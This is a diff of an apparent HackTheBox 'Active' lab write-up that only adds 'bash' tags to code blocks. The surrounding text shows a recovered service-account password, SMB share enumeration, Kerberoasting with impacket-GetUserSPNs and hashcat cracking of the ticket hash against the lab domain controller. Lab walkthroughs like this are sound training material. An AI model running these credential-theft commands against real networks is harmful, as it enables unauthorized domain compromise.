@@ -84,7 +84,7 @@ We found the pass for user **active.htb\SVC_TGS** : **GPPstillStandingStrong2k18
 
 With the username and password, let's enumerate the smb with the credential.
 
-```
+```bash
 smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
 ```
 
@@ -94,7 +94,7 @@ We gain access to three more shares: `NETLOGON, SYSVOL, Users`
 
 ### Shares Users - SMB
 
-```
+```bash
 smbclient //10.10.10.100/Users -U "active.htb\\SVC_TGS%GPPstillStandingStrong2k18"
 ```
 
@@ -112,7 +112,7 @@ We'll use the **active.htb/SVC_TGS**:`GPPstillStandingStrong2k18` credentials to
 
 We found a user: Administrator
 
-```
+```bash
 impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
 ```
 
@@ -120,13 +120,13 @@ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outp
 
 It also gives me the ticket, which I can try to brute-force decrypt to get the user's password:
 
-```
+```bash
 cat GetUserSPNs.out
 ```
 
 Cracking the hash:
 
-```
+```bash
 hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
 ```
 
